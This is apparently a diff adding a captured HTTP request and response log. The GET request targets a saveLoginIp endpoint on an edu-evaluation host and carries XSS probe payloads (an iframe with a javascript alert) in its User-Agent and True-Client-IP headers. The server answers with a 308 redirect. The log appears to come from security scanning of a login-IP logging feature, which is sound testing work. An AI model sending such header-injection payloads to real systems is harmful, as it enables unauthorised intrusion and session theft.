@@ -1,0 +1,18 @@
+REQUEST:
+GET https://edu-evaluation.baliprov.dev/rest/saveLoginIp/
+User-Agent: <iframe src="javascript:alert(`xss`)">
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+True-Client-IP: <iframe src="javascript:alert(`xss`)">
+
+
+
+RESPONSE:
+HTTP 308
+Date: Wed, 25 Nov 2026 00:19:25 GMT
+Transfer-Encoding: chunked
+Connection: keep-alive
+Location: /rest/saveLoginIp
+Refresh: 0;url=/rest/saveLoginIp
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+/rest/saveLoginIp
